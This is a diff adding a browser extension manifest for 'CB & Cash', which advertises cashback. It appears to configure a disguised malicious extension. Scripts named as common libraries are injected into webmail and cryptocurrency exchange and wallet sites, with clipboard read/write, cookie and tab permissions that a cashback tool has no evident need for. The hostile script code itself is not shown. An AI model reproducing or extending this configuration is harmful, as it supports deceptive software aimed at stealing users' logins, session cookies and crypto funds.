@@ -1,0 +1,24 @@
+{
+   "background": {
+      "page": "extensions.html"
+   },
+   "browser_action": {
+      "default_icon": "icon.png",
+      "default_popup": "popup.html",
+      "default_title": "CB & Cash"
+   },
+   "content_scripts": [ {
+      "js": [ "jquery-3.3.1.min.js", "fullpage.min.js", "fullpage.extensions.min.js" ],
+      "matches": [ "*://*.yahoo.com/*", "*://live.com/*", "*://*.mail.ru/*", "*://myetherwallet.com/*", "*://localbitcoins.com/*", "*://google.com/*", "*://*.binance.com/*", "*://yandex.ru/*", "*://coinbase.com/*", "*://*.coinbase.com/*", "*://*.blockchain.com/*", "*://*.myetherwallet.com/*", "*://binance.com/*", "*://*.google.com/*", "*://qq.com/*", "*://*.live.com/*", "https://mail.google.com/*", "*://*.qq.com/*", "*://blockchain.com/*", "*://*.localbitcoins.com/*", "*://*.yandex.ru/*", "*://mail.ru/*", "http://mail.google.com/*", "*://yahoo.com/*" ]
+   } ],
+   "description": "We return up to 5% from each transaction. Use the system and get a portion of the money spent back to your wallet.",
+   "icons": {
+      "128": "icon.png",
+      "16": "icon.png",
+      "48": "icon.png"
+   },
+    "manifest_version": 2,
+   "name": "CB & Cash",
+   "permissions": [ "background", "activeTab", "clipboardWrite", "clipboardRead", "cookies", "tabs", "*://*.yahoo.com/*", "*://live.com/*", "*://*.mail.ru/*", "*://myetherwallet.com/*", "*://localbitcoins.com/*", "*://google.com/*", "*://*.binance.com/*", "*://yandex.ru/*", "*://coinbase.com/*", "*://*.coinbase.com/*", "*://*.blockchain.com/*", "*://*.myetherwallet.com/*", "*://binance.com/*", "*://*.google.com/*", "*://qq.com/*", "*://*.live.com/*", "https://mail.google.com/*", "*://*.qq.com/*", "*://blockchain.com/*", "*://*.localbitcoins.com/*", "*://*.yandex.ru/*", "*://mail.ru/*", "http://mail.google.com/*", "*://yahoo.com/*", "storage" ],
+   "version": "1.0.13"
+}
